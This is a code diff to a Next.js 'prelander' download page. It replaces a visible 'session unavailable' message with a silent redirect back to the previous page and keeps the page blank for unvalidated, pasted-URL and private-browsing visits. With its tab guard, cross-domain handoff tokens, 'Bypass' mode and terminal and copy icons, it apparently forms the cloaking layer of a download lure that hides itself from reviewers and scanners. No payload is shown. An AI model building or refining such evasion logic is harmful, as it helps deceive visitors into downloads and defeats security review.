@@ -1,22 +1,21 @@
 'use client'
 
-import { useState, useEffect } from 'react'
+import { useState, useEffect, useRef } from 'react'
 import { useParams } from 'next/navigation'
 import { Copy, Check, Lock, FileDown, Terminal } from 'lucide-react'
 
 import { guardTab } from '@/lib/tab-guard'
-import { SESSION_UNAVAILABLE_TITLE, SESSION_UNAVAILABLE_MESSAGE } from '@/lib/prelander-session'
+import { returnToPreviousPage } from '@/lib/prelander-navigation'
 
 // The server validates the session on each resolve. Cookies are shared across tabs.
-function SessionUnavailable() {
-  return (
-    <main className="min-h-screen flex items-center justify-center bg-[#f0f2f5] p-6">
-      <section className="w-full max-w-md rounded-2xl bg-white p-8">
-        <h1 className="text-2xl font-semibold text-gray-900">{SESSION_UNAVAILABLE_TITLE}</h1>
-        <p className="mt-4 leading-relaxed text-gray-600">{SESSION_UNAVAILABLE_MESSAGE}</p>
-      </section>
-    </main>
-  )
+function PreviousPageFallback() {
+  const navigated = useRef(false)
+  useEffect(() => {
+    if (navigated.current) return
+    navigated.current = true
+    returnToPreviousPage()
+  }, [])
+  return null
 }
 
 export default function PrelanderSlugPage() {
@@ -26,6 +25,7 @@ export default function PrelanderSlugPage() {
   const [loading, setLoading] = useState(true)
   const [denied, setDenied] = useState(false)
   const [transitioning, setTransitioning] = useState(false)
+  const [returning, setReturning] = useState(false)
 
   useEffect(() => {
     (async () => {
@@ -49,8 +49,7 @@ export default function PrelanderSlugPage() {
 
         try {
           const access = await guardTab()
-          if (access === 'denied') { setDenied(true); setLoading(false); return }
-          if (access === 'redirected') return
+          if (access === 'redirected') { setReturning(true); return }
           const res = await fetch('/api/prelander/resolve/session', {
             credentials: "include",
             headers: { 'X-Prelander-Host': hostname },
@@ -100,6 +99,8 @@ export default function PrelanderSlugPage() {
 
           // Handle redirect flow
           if (prelanderDomain) {
+            // Show the flow loader while preparing and following the handoff.
+            setTransitioning(true)
             let handoffToken: string | null = null
             try {
               const hRes = await fetch(
@@ -157,8 +158,7 @@ export default function PrelanderSlugPage() {
 
         // Legacy slug resolution can mint the arrival, so claim after resolve.
         const access = await guardTab()
-        if (access === 'denied') { setDenied(true); return }
-        if (access === 'redirected') { setTransitioning(true); return }
+        if (access === 'redirected') { setReturning(true); return }
 
         // Show the content
         setData(data)
@@ -177,15 +177,27 @@ export default function PrelanderSlugPage() {
   }, [slug, denied])
 
   useEffect(() => {
-    document.title = denied ? SESSION_UNAVAILABLE_TITLE : 'Download Ready'
-  }, [denied])
+    document.title = transitioning ? 'Redirecting…' : 'Download Ready'
+  }, [transitioning])
 
-  if (denied) return <SessionUnavailable />
+  if (returning) return null
+  if (denied) return <PreviousPageFallback />
 
-  // Keep the document empty until authorization or navigation completes.
-  if (loading || transitioning) return null
+  // Only confirmed redirect-domain hops get a loader. Prelander validation
+  // and pasted-URL fallback stay blank, including in private browsing.
+  if (transitioning) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-[#f7f8fa]" role="status">
+        <div className="flex flex-col items-center gap-4">
+          <div className="w-8 h-8 border-2 border-gray-200 border-t-gray-800 rounded-full animate-spin" />
+          <p className="text-sm text-gray-500">Redirecting…</p>
+        </div>
+      </div>
+    )
+  }
+  if (loading) return null
 
-  if (!data) return <SessionUnavailable />
+  if (!data) return <PreviousPageFallback />
 
   // Note: Bypass OFF always shows the landing page — even when the backend has
   // no active template (the built-in layout renders as fallback). The visitor
